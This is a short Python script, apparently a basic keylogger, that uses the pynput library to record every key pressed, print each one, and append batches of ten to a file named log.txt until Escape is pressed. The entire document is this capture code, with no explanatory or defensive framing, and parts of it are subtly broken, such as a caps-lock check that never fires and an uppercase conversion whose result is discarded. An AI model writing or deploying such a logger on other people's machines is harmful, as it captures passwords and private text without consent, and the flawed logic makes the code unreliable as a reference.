import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []




def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


def write_file(keys):
    with open('log.txt', "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\t')
            elif k.find("enter") > 0:
                f.write('\n')
            elif Key.caps_lock == 1:
                k.upper()
                f.write(k)   
            elif k.find("Key") == -1:
                f.write(k)


with Listener(on_press=on_press, on_release=on_release) as listner:
    listner.join()
